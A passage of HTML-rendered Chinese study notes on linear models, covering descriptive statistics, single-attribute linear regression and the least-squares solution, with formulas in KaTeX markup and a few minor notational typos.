class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.924661em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span>，<code>w</code>和<code>b</code>确认后，模型即可确认。</li><li>线性模型形式简单、易于建模，却蕴涵着机器学习中的一些重要的基本思想。许多功能更为强大的非线性模型（nonlinear model）可以在线性模型的基础上通过引入层级结构或者高维映射而得。</li></ul><h2 id="线性回归"><a class="markdownIt-Anchor" href="#线性回归"></a> 线性回归</h2><h3 id="度量指标"><a class="markdownIt-Anchor" href="#度量指标"></a> 度量指标</h3><ul><li><p>集中趋势的衡量</p><ul><li>均值：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>x</mi><mo>ˉ</mo></mover><mo>=</mo><mfrac><mrow><mo>∑</mo><msup><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msup><msub><mi>x</mi><mi>i</mi></msub></mrow><mi>n</mi></mfrac></mrow><annotation encoding="application/x-tex">\bar{x}=\frac{\sum{i=1}^nx_i}{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.56778em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">ˉ</span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.3550069999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0100069999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485007em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7385428571428572em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>；</li><li>中位数：大小排序后，中间位置的数；</li><li>众数：出现最多的数；</li></ul></li><li><p>离散程度的衡量</p><ul><li>方差:<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>s</mi><mn>2</mn></msup><mo>=</mo><mfrac><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>−</mo><mover accent="true"><mi>x</mi><mo>ˉ</mo></mover><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">s^2=\frac{\sum_{i=1}^{n}(x_i-\bar{x})^2}{n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.562258em;vertical-align:-0.403331em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.158927em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5350070000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7385428571428572em;"><span style="top:-2.1785614285714283em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32143857142857146em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord accent mtight"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="accent-body" style="left:-0.22222em;"><span class="mtight">ˉ</span></span></span></span></span></span></span><span class="mclose mtight"><span class="mclose mtight">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.403331em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li><li>标准差：<code>s</code></li></ul></li></ul><h3 id="单属性线性回归"><a class="markdownIt-Anchor" href="#单属性线性回归"></a> 单属性线性回归</h3><ul><li><p>先研究单属性线性回归问题，也即：</p><ol><li>训练集只有一个属性</li><li>给定数据集<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mo>=</mo><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><msub><mi>m</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">D={(x_i,y_i)}m_i=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li><li>线性预测表示为：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>=</mo><mi>w</mi><msub><mi>x</mi><mi>i</mi></msub><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x_i=wx_i+b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span></li><li>通过训练集得到w和b的值，使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>≈</mo><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">f(x_i)≈y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li></ol></li><li><p>均方差是常用的性能度量指标：</p></li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msup><mi>ω</mi><mo>∗</mo></msup><mo separator="true">,</mo><msup><mi>b</mi><mo>∗</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mi>arg</mi><mo>⁡</mo><munder><mo><mi>min</mi><mo>⁡</mo></mo><mrow><mo stretchy="false">(</mo><mi>ω</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow></munder><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>−</mo><msub><mi>y</mi><mi>i</mi></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><mo>=</mo><mi>arg</mi><mo>⁡</mo><munder><mo><mi>min</mi><mo>⁡</mo></mo><mrow><mo stretchy="false">(</mo><mi>ω</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow></munder><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>−</mo><mi>ω</mi><msub><mi>x</mi><mi>i</mi></msub><mo>−</mo><mi>b</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mrow><annotation encoding="application/x-tex">(\omega^*,b^*)=\arg\min_{(\omega,b)}\sum_{i=1}^{m}{(f(x_i)-y_i)^2}=\arg\min_{(\omega,b)}\sum_{i=1}^{m}{(y_i-\omega x_i-b)^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.738696em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.738696em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.66786em;"><span style="top:-2.009em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">ω</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight">b</span><span class="mclose mtight">)</span></span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop">min</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.966em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.66786em;"><span style="top:-2.009em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">ω</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight">b</span><span class="mclose mtight">)</span></span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop">min</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.966em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">b</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>只需针对<code>w</code>和<code>b</code>分别求偏导即可得到最优解（闭式close-form解）<code>w</code>和<code>b</code>。</li><li>基于均方误差最小化来进行模型求解的方法也称为最小二乘法。在线性回归中，最小二乘法可以找到一条这样的直线，使得所有样本到直线上的欧氏距离之和最小。</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>w</mi><mo>=</mo><mfrac><mrow><mo>∑</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>−</mo><mover accent="true"><mi>x</mi><mo stretchy="true">‾</mo></mover><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>−</mo><mover accent="true"><mi>y</mi><mo stretchy="true">‾</mo></mover><mo stretchy="false">)</mo></mrow><mrow><mo>∑</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>−</mo><mover accent="true"><mi>x</mi><mo stretchy="true">‾</mo></mover><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">w=\frac{\sum (x_i-\overline x)(y_i-\overline y)}{\sum (x_i-\overline x)^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.36301em;vertical-align:-0.93601em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" 